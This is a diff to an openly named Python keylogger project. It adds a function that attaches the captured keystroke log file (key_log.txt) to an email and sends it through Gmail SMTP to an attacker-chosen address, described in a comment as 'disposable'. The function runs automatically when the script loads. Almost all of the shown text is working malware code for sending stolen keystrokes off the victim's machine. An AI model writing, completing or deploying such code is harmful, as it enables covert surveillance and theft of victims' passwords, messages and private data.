@@ -26,9 +26,56 @@ from PIL import ImageGrab
 import pyperclip
 
 keys_information = "key_log.txt"
+email_address = "#######"
+password = "######"  # use google app password
+toaddr = "######"  # disposable email of your choice
 
 file_path = "//Users//joshuamcleod//Advanced-Python-Keylogger//Keylogger"
 extend = "//"
+
+
+def send_email(filename, attachment, toaddr):
+    fromaddr = email_address
+
+    msg = MIMEMultipart()  # MIME(email) function
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg["Subject"] = "Log File"
+
+    body = "Body_of_the_email"
+
+    msg.attach(MIMEText(body, 'plain'))  # plain format
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet-stream')  # settings for mimebase
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, password)
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+
+send_email(keys_information, file_path + extend + keys_information, toaddr)
 
 count = 0
 keys = []
